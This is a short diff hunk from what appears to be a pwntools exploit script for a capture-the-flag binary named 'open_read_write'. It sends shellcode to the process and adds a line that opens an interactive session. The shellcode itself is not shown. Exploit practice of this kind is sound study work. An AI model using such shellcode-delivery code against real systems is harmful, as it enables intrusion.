@@ -26,3 +26,4 @@ else:
         c = process("./open_read_write")
 
 c.send(shell_asm)
+c.interactive()
